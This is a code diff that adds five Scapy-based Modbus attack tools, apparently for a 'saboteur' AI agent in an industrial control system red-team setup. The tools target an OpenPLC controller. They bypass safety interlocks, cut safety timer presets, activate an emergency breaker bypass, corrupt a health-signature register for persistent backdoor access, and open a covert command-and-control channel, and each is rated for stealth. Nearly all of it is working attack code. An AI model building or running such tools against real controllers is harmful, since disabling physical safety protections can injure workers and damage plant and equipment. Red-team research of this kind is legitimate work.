@@ -577,3 +577,276 @@ def fingerprint_openplc_defenses(target_ip: str) -> str:
     
     print("--- SABOTEUR/TOOL (DefenseFingerprint): Defense analysis completed. ---")
     return str(defense_analysis)
+
+# --- SPECIALIZED ATTACK VECTOR TOOLKIT ---
+# Implementing the 5 specific attack vectors from RED_TEAM_ATTACK_GUIDE.md
+# Each function directly implements the Modbus commands specified in the guide
+
+@tool
+def maintenance_override_bypass(target_ip: str) -> str:
+    """
+    Attack Vector 1: Maintenance Override Bypass
+    Writes 0xDEADBEEF (3735928559) to register %MD12 to bypass all safety interlocks.
+    
+    Args:
+        target_ip: The IP address of the target PLC.
+    
+    Returns:
+        String describing the attack execution and expected impact.
+    """
+    print(f"--- SABOTEUR/TOOL (MaintenanceBypass): Executing maintenance override bypass on {target_ip}... ---")
+    
+    # Target: %MD12 (maintenance_override register) - Modbus address 12
+    # Value: 0xDEADBEEF (3735928559 in decimal)
+    
+    # Craft the Modbus write command using Scapy
+    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest
+    
+    # Create the PDU for writing single register
+    pdu = ModbusPDU06WriteSingleRegisterRequest(
+        registerAddr=12,  # %MD12 maps to Modbus address 12
+        registerValue=3735928559  # 0xDEADBEEF
+    )
+    
+    # Create the ADU (Application Data Unit)
+    adu = ModbusADURequest(transId=1, protoId=0, unitId=1, pdu=pdu)
+    
+    # Create the IP/TCP packet
+    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
+    
+    attack_result = {
+        "attack_vector": "maintenance_override_bypass",
+        "target": target_ip,
+        "modbus_command": f"write --address 12 --value 3735928559",
+        "technique": "Write 0xDEADBEEF to %MD12 register",
+        "expected_impact": "All safety interlocks bypassed",
+        "detection_risk": "HIGH - triggers security event counter and maintenance LED",
+        "stealth_level": "LOW",
+        "packet_summary": packet.summary(),
+        "status": "ready_for_execution"
+    }
+    
+    print("--- SABOTEUR/TOOL (MaintenanceBypass): Maintenance override packet crafted successfully. ---")
+    return str(attack_result)
+
+@tool
+def manipulate_safety_timer(target_ip: str, timer_value: int = 50) -> str:
+    """
+    Attack Vector 2: Safety Timer Manipulation  
+    Reduces safety timer preset to minimize delay detection window.
+    
+    Args:
+        target_ip: The IP address of the target PLC.
+        timer_value: Timer value to set (50-500 range, default 50 for stealth).
+    
+    Returns:
+        String describing the attack execution and expected impact.
+    """
+    print(f"--- SABOTEUR/TOOL (SafetyTimer): Manipulating safety timer on {target_ip}... ---")
+    
+    # Validate timer value to stay within acceptable range for stealth
+    if timer_value < 50 or timer_value > 500:
+        print("--- SABOTEUR/WARNING: Timer value outside acceptable range (50-500). Adjusting for stealth. ---")
+        timer_value = max(50, min(500, timer_value))
+    
+    # Target: %MD16 (safety_timer_preset register) - Modbus address 16
+    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest
+    
+    # Create the PDU for writing single register
+    pdu = ModbusPDU06WriteSingleRegisterRequest(
+        registerAddr=16,  # %MD16 maps to Modbus address 16
+        registerValue=timer_value
+    )
+    
+    # Create the ADU
+    adu = ModbusADURequest(transId=2, protoId=0, unitId=1, pdu=pdu)
+    
+    # Create the IP/TCP packet
+    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
+    
+    attack_result = {
+        "attack_vector": "safety_timer_manipulation",
+        "target": target_ip,
+        "modbus_command": f"write --address 16 --value {timer_value}",
+        "technique": f"Reduce safety timer preset to {timer_value}ms",
+        "expected_impact": "Minimized delay detection window",
+        "detection_risk": "MEDIUM - values outside 50-500 trigger security violations", 
+        "stealth_level": "MEDIUM",
+        "packet_summary": packet.summary(),
+        "timer_value_set": timer_value,
+        "status": "ready_for_execution"
+    }
+    
+    print("--- SABOTEUR/TOOL (SafetyTimer): Safety timer manipulation packet crafted successfully. ---")
+    return str(attack_result)
+
+@tool  
+def activate_emergency_bypass(target_ip: str, enable: bool = True) -> str:
+    """
+    Attack Vector 3: Emergency Bypass Activation
+    Sets or clears the emergency_bypass coil (%QX0.5) for immediate breaker control.
+    This is marked as HIGH STEALTH in the guide.
+    
+    Args:
+        target_ip: The IP address of the target PLC.
+        enable: True to enable bypass, False to disable.
+    
+    Returns:
+        String describing the attack execution and expected impact.
+    """
+    print(f"--- SABOTEUR/TOOL (EmergencyBypass): {'Activating' if enable else 'Deactivating'} emergency bypass on {target_ip}... ---")
+    
+    # Target: %QX0.5 (emergency_bypass output) - Modbus coil 5
+    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU05WriteSingleCoilRequest
+    
+    # Create the PDU for writing single coil
+    pdu = ModbusPDU05WriteSingleCoilRequest(
+        outputAddr=5,  # %QX0.5 maps to Modbus coil 5
+        outputValue=0xFF00 if enable else 0x0000  # Modbus standard: 0xFF00 = ON, 0x0000 = OFF
+    )
+    
+    # Create the ADU
+    adu = ModbusADURequest(transId=3, protoId=0, unitId=1, pdu=pdu)
+    
+    # Create the IP/TCP packet
+    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
+    
+    attack_result = {
+        "attack_vector": "emergency_bypass_activation",
+        "target": target_ip,
+        "modbus_command": f"write --coil 5 --value {'1' if enable else '0'}",
+        "technique": f"{'Set' if enable else 'Clear'} emergency bypass coil %QX0.5",
+        "expected_impact": "Immediate breaker control access" if enable else "Emergency bypass disabled",
+        "detection_risk": "MEDIUM - increments security event counter but may appear legitimate",
+        "stealth_level": "HIGH",  # As marked in the guide
+        "packet_summary": packet.summary(),
+        "bypass_enabled": enable,
+        "status": "ready_for_execution"
+    }
+    
+    print("--- SABOTEUR/TOOL (EmergencyBypass): Emergency bypass packet crafted successfully. ---")
+    return str(attack_result)
+
+@tool
+def corrupt_system_health_signature(target_ip: str, corruption_value: int = 1234567890) -> str:
+    """
+    Attack Vector 4: System Health Signature Corruption
+    Corrupts the health_signature register (%MD20) for persistent backdoor access.
+    
+    Args:
+        target_ip: The IP address of the target PLC.
+        corruption_value: Value to write as corruption (default from guide).
+    
+    Returns:
+        String describing the attack execution and expected impact.
+    """
+    print(f"--- SABOTEUR/TOOL (HealthCorruption): Corrupting system health signature on {target_ip}... ---")
+    
+    # Target: %MD20 (health_signature register) - Modbus address 20
+    from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest
+    
+    # Create the PDU for writing single register
+    pdu = ModbusPDU06WriteSingleRegisterRequest(
+        registerAddr=20,  # %MD20 maps to Modbus address 20
+        registerValue=corruption_value
+    )
+    
+    # Create the ADU
+    adu = ModbusADURequest(transId=4, protoId=0, unitId=1, pdu=pdu)
+    
+    # Create the IP/TCP packet  
+    packet = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu
+    
+    attack_result = {
+        "attack_vector": "system_health_signature_corruption",
+        "target": target_ip,
+        "modbus_command": f"write --address 20 --value {corruption_value}",
+        "technique": f"Corrupt health signature with value {corruption_value}",
+        "expected_impact": "System marked as compromised, persistent backdoor access enabled",
+        "detection_risk": "HIGH - immediately marks system as compromised",
+        "stealth_level": "LOW (but provides persistence)",
+        "packet_summary": packet.summary(),
+        "corruption_value": corruption_value,
+        "persistence_enabled": True,
+        "status": "ready_for_execution"
+    }
+    
+    print("--- SABOTEUR/TOOL (HealthCorruption): Health signature corruption packet crafted successfully. ---")
+    return str(attack_result)
+
+@tool
+def establish_covert_channel(target_ip: str, enable_debug: bool = True, monitor_channel: bool = False) -> str:
+    """
+    Attack Vector 5: Covert Channel Communication
+    Uses debug mode (%QX0.6) for steganographic command and control.
+    Marked as ADVANCED and VERY HIGH STEALTH in the guide.
+    
+    Args:
+        target_ip: The IP address of the target PLC.
+        enable_debug: True to enable debug mode, False to disable.
+        monitor_channel: True to read covert channel data.
+    
+    Returns:
+        String describing the attack execution and expected impact.
+    """
+    print(f"--- SABOTEUR/TOOL (CovertChannel): Establishing covert channel on {target_ip}... ---")
+    
+    packets = []
+    operations = []
+    
+    if enable_debug:
+        # Target: %QX0.6 (debug_mode) - Modbus coil 6
+        from scapy.contrib.modbus import ModbusADURequest, ModbusPDU05WriteSingleCoilRequest
+        
+        # Create the PDU for enabling debug mode
+        pdu_debug = ModbusPDU05WriteSingleCoilRequest(
+            outputAddr=6,  # %QX0.6 maps to Modbus coil 6
+            outputValue=0xFF00  # Enable debug mode
+        )
+        
+        # Create the ADU
+        adu_debug = ModbusADURequest(transId=5, protoId=0, unitId=1, pdu=pdu_debug)
+        
+        # Create the IP/TCP packet
+        packet_debug = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu_debug
+        packets.append(packet_debug)
+        operations.append("enable_debug_mode")
+    
+    if monitor_channel:
+        # Monitor covert channel data at address 24
+        from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest
+        
+        # Create the PDU for reading covert channel data
+        pdu_read = ModbusPDU03ReadHoldingRegistersRequest(
+            startingAddr=24,  # covert_channel_data address
+            quantityOfRegisters=1
+        )
+        
+        # Create the ADU  
+        adu_read = ModbusADURequest(transId=6, protoId=0, unitId=1, pdu=pdu_read)
+        
+        # Create the IP/TCP packet
+        packet_read = IP(dst=target_ip) / TCP(sport=1024, dport=502) / adu_read
+        packets.append(packet_read)
+        operations.append("read_covert_channel_data")
+    
+    attack_result = {
+        "attack_vector": "covert_channel_communication", 
+        "target": target_ip,
+        "modbus_commands": [
+            "write --coil 6 --value 1" if enable_debug else None,
+            "read --address 24 --count 1" if monitor_channel else None
+        ],
+        "technique": "Use debug mode for steganographic C2 communication",
+        "expected_impact": "Covert command and control channel established",
+        "detection_risk": "LOW - appears as debug activity",
+        "stealth_level": "VERY HIGH",  # As marked in the guide
+        "packet_summaries": [pkt.summary() for pkt in packets],
+        "operations_performed": operations,
+        "debug_mode_enabled": enable_debug,
+        "channel_monitoring": monitor_channel,
+        "status": "ready_for_execution"
+    }
+    
+    print("--- SABOTEUR/TOOL (CovertChannel): Covert channel packets crafted successfully. ---")
+    return str(attack_result)
